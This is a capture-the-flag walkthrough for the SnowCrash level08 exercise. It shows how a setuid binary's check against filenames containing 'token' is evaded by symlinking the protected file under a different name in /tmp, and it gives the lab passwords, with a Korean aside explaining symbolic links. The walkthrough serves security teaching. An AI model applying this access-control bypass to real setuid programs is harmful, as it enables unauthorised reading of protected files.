## Level08

Login as usual wih a password

```
ssh -i ~/.ssh/id_rsa.pub level08@127.0.0.1 -p 4242
fiumuikeil55xe9cu4dood66h
```

There is a token file, but we don't have a permission.
There's another binary file named as "level08".

```
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ cat token
cat: token: Permission denied
level08@SnowCrash:~$ file level08
level08: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped
```

I executed the file, but nothing came out.
Same for the ltrace command, we need a another file to be read.

```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ltrace level08
Can't execute `level08': No such file or directory
PTRACE_SETOPTIONS: No such process
level08@SnowCrash:~$ ltrace ./level08
__libc_start_main(0x8048554, 1, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)                                     = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

So, no access to the token

```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ chmod 777 token
chmod: changing permissions of `token': Operation not permitted
```

But seems like they didn't accept for the word "token" for the execution of the file ./level08. Because, it keep telling me that I don't have any access to the token.

When I put the `./level08  helloworld`, it shows different error message that they couldn't find the file.

```
level08@SnowCrash:~$ ./level08  token
You may not access 'token'
level08@SnowCrash:~$ ./level08  tokenHello
You may not access 'tokenHello'
level08@SnowCrash:~$ ./level08  hellotokenHello
You may not access 'hellotokenHello'
level08@SnowCrash:~$ ./level08  helloworld
level08: Unable to open helloworld: No such file or directory
```

So, since we don't have any access, let's create the symbolic link as we did in previous exercises, and also changing the name of the file that do NOT contain the "token"

`ln -s /home/user/level08/token /tmp/level08flag`
This command creates a symbolic link named `/tmp/level08flag` that points to the file located at `/home/user/level08/token`.

<details>

  <summary> Details in Korean </summary>
  
<br>

`ln -s /home/user/level08/token /tmp/level08flag`

여기서 `ln`은 링크를 생성하는 명령어이며, `-s` 옵션은 심볼릭 링크를 생성하도록 지정합니다. `/home/user/level08/token`은 링크 대상 파일의 경로를 나타내며, 이 파일이 실제로 존재해야 합니다. `/tmp/level08flag`는 생성될 심볼릭 링크의 경로를 나타냅니다. 이제 `/tmp/level08flag` 경로를 통해 `/home/user/level08/token` 파일에 접근할 수 있습니다.

즉, 이 명령은 `/tmp/level08flag`라는 심볼릭 링크를 생성하여 이 링크가 `/home/user/level08/token` 파일을 가리키도록 만듭니다.

📌 심볼릭 링크(symbolic link) ?
<br>
심볼릭 링크(symbolic link)는 파일 시스템에서 파일에 대한 가상의 별칭(alias)을 생성하는 방법입니다. 즉, 다른 파일이나 디렉토리를 가리키는 파일을 만들 수 있습니다. 이 링크는 원본 파일이나 디렉토리의 위치를 가리키고 있습니다.

심볼릭 링크는 다음과 같은 특징을 갖습니다:

1. 가리키는 대상을 변경할 수 있습니다: 심볼릭 링크는 가리키는 대상이 변경될 수 있으므로, 실제 파일이나 디렉토리가 이동되거나 이름이 변경되더라도 링크는 유효하게 유지됩니다.

2. 파일 시스템 간에 링크 가능: 심볼릭 링크는 다른 파일 시스템에 있는 파일이나 디렉토리를 가리킬 수 있습니다.

3. 다양한 운영 체제에서 사용 가능: 심볼릭 링크는 여러 운영 체제에서 지원되며, 다양한 운영 체제에서 동일한 파일 시스템을 공유할 때 유용하게 사용됩니다.

4. 심볼릭 링크 자체의 크기는 매우 작습니다: 일반적으로 심볼릭 링크는 몇 바이트 이므로 파일 시스템 공간을 많이 차지하지 않습니다.

따라서 심볼릭 링크는 파일이나 디렉토리를 가리키는 가상의 별칭을 만들어서 편리하게 사용할 수 있도록 해줍니다.

  </details>

```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/level08flag
level08@SnowCrash:~$ ./level08 /tmp/level08flag
quif5eloekouj29ke0vouxean
```

And we got our password 😘

<details>
  <summary> Password </summary>
  quif5eloekouj29ke0vouxean
  </details>
